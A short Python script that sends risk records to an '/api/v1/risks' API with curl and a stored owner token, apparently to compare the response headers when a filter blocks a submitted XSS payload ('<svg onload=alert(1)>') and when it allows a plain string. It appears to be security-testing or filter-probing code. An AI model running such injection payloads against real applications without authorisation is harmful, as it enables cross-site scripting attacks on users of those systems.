import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
tag='ZXE'+uuid.uuid4().hex[:5]
def raw(pay):
    cmd=['curl','-s','-i','-m','25','-X','POST',H+'/api/v1/risks',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System',
         '-d',json.dumps({"risk":{"name":pay}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout
print("=== 403 response headers (blocked payload) ===")
r=raw(f'<svg onload=alert(1)>{tag}')
print('\n'.join(r.splitlines()[:20]))
print()
print("=== 200 response headers (allowed payload) ===")
r2=raw(f'plain{tag}')
print('\n'.join(r2.splitlines()[:20]))
